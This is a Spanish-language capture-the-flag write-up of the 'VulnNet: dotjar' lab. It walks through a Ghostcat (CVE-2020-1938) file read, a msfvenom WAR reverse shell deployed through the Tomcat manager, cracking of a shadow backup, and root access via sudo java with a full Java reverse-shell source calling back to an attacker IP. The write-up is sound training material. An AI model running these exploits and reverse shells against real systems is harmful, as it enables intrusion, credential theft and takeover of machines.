# VulnNet: dotjar

Comenzamos realizando un escaneo de puertos en la máquina objetivo.

```bash
nmap -sV -sC -p- -T4 <ip>
```

* -sV: Sondeo de puertos abiertos para determinar la información del servicio/versión
* -sC: equivalente a _--script=default_.
* -p-: Escanea todos los puertos de la Red (65536)
* -T4: La velocidad de escaneo de puertos.

Se han identificado cuatro puertos abiertos en el sistema: el puerto `22` para `SSH`, el `8009` para `ajp13`, el `8080`, para `HTTP` 

<figure><img src="../.gitbook/assets/VulnNet: dotjar/nmap.png" alt=""><figcaption></figcaption></figure>

Al enumerar las páginas, no encontramos nada interesante; solo se abre la página de `Tomcat`. Sin embargo, aquí hay un dato relevante: la versión que está ejecutando es `Apache Tomcat/9.0.30`. Al buscar en internet, descubrimos que existe un exploit para esta versión.

<figure><img src="../.gitbook/assets/VulnNet: dotjar/tomcat.png" alt=""><figcaption></figcaption></figure>

El siguiente enlace nos proporciona una introducción sobre cómo funciona el exploit. Podemos optar por clonar el repositorio o simplemente descargar el archivo `.py`.

{% embed url="https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md" %}

Una vez que lo descargues es facil de implementar.

```
python CVE-2020-1938.py <IP address> -p 8009 -f WEB-INF/web.xml 
```

Esto nos proporciona unas credenciales que nos permiten iniciar sesión en `Tomcat`.

<figure><img src="../.gitbook/assets/VulnNet: dotjar/creds.png" alt=""><figcaption></figcaption></figure>

Aunque no contamos con una interfaz gráfica para acceder directamente a la página web, podemos hacerlo desde la terminal utilizando `curl`. Aquí realizaremos un despliegue en la página web para obtener nuestra `reverse shell` en el servidor.

Primero, necesitamos el archivo `.war` que contenga nuestro `payload`. Podemos generarlo utilizando `msfvenom` con el siguiente comando:

```
msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=4242 -f war > shell.war
```

Esto nos permitirá realizar un despliegue en `Tomcat` para que lo cargue directamente en la web, lo que nos proporcionará una `reverse shell`.

```
curl -u webdev -T shell.war 'http://10.201.15.169:8080/manager/text/deploy?path=/shell.war'
```

Se nos pedirá la contraseña que encontramos anteriormente, y recibiremos un mensaje indicando que se ejecutó con éxito.

<figure><img src="../.gitbook/assets/VulnNet: dotjar/upda.png" alt=""><figcaption></figcaption></figure>

Realizamos una solicitud a la dirección donde colocamos nuestra `reverse shell`, que es la siguiente:

```
http://<ip>:8080/shell.war
```

Y obtenemos una shell que nos ayudará a elevar nuestros privilegios.

<figure><img src="../.gitbook/assets/VulnNet: dotjar/curklq.png" alt=""><figcaption></figcaption></figure>

# \web

Después de la enumeración, identificamos un vector que nos permite leer una copia de seguridad ubicada en `/var/backup`, específicamente el archivo `shadow-backup-alt.gz`.

<figure><img src="../.gitbook/assets/VulnNet: dotjar/backjup.png" alt=""><figcaption></figcaption></figure>

Lo copiamos al directorio `/tmp` para poder extraer la informacion:

```
cp shadow-backup-alt.gz /tmp

cd /tmp

gunzip shadow-backup-alt.gz
```

<figure><img src="../.gitbook/assets/VulnNet: dotjar/hsadow.png" alt=""><figcaption></figcaption></figure>

Leemos el archivo y confirmamos que contiene lo que esperábamos: un archivo con las copias de seguridad de los `shadows` de los `usuarios`. Lo copiamos a nuestra máquina para poder descifrar la contraseña de `jdk-admin`.

```
jonh --wordlist /usr/share/wordlist/rockyou.txt hash
```

<figure><img src="../.gitbook/assets/VulnNet: dotjar/uncripshadow.png" alt=""><figcaption></figcaption></figure>

# \jdk-admin

De esta manera, obtenemos acceso `SSH` para el usuario `jdk-admin`, así como el archivo `user.txt`.

<figure><img src="../.gitbook/assets/VulnNet: dotjar/user.png" alt=""><figcaption></figcaption></figure>

Realizamos una enumeración con `linpeas.sh`. Tenemos varios ataques que podemos desarrollar, pero podemos suponer que está relacionado con `Java`, ya que se menciona al iniciar el laboratorio. Con el usuario y la contraseña de `jdk-admin`, podemos ejecutar el siguiente comando:

```
sudo -l
```

<figure><img src="../.gitbook/assets/VulnNet: dotjar/sudo-l.png" alt=""><figcaption></figcaption></figure>

Esto indica que podemos ejecutar cualquier archivo `.jar` con el usuario `root`, lo que nos permite implantar otra `reverse shell` para obtener los permisos de `root`.

1. Creamos nuestro archivo con código de java que es `shell.java`

```
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "10.9.2.64";
        int port = 4243;
        String cmd = "sh";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}
```

2. Creamos un archivo llamado `MANIFEST.MF`

```
Manifest-Version: 1.0
Main-Class: shell
```

3. Ejecutamos `javac` para compilar las clases que tenemos que solo es una, y con la version correcta para que se ejecute en el sistema victima.

```
 javac -source 1.8 -target 1.8 shell.java
```

Te quedara un archivo `shell.class`

<figure><img src="../.gitbook/assets/VulnNet: dotjar/class.png" alt=""><figcaption></figcaption></figure>

1. Con todos los archivos anteriores ya podemos crear nuestro archivo `.jar`

```
jar cfm shell.jar MANIFEST.MF shell.class
```

<figure><img src="../.gitbook/assets/VulnNet: dotjar/jar.png" alt=""><figcaption></figcaption></figure>

Solo quería descargar nuestro archivo `.jar` en los archivos del sistema de la víctima, y puedes hacerlo utilizando `Python`.

Maquina Atacante:

```
python3 -m http.server <port>
```

Maquina Victima:
```
wget http://<ip>:<port>/shell.jar
```

Por último, debemos iniciar el oyente y ejecutar el archivo con los permisos de `root` para obtener nuestro último archivo, `root.txt`.

Maquina Atacante:
```
nc -lvnp <port>
```

Maquina Victima:
```
sudo -u root /usr/bin/java -jar shell.jar
```

<figure><img src="../.gitbook/assets/VulnNet: dotjar/root.png" alt=""><figcaption></figcaption></figure>

-------------

>*El mayor error que puedes cometer es tener miedo de hacer algo todo el tiempo.* ~ Elbert Hubbard
>
>*Con esto quiero enfatizar que el miedo a equivocarse es más paralizante que el error en sí. El error puede enseñarnos y abrir nuevos caminos, mientras que el miedo constante al fracaso nos detiene y nos impide vivir plenamente. El verdadero coraje no es la ausencia de miedo, sino la decisión de actuar a pesar de él.*
>
><figure><img src="../.gitbook/assets/VulnNet: dotjar/touthou.png" alt=""><figcaption></figcaption></figure>
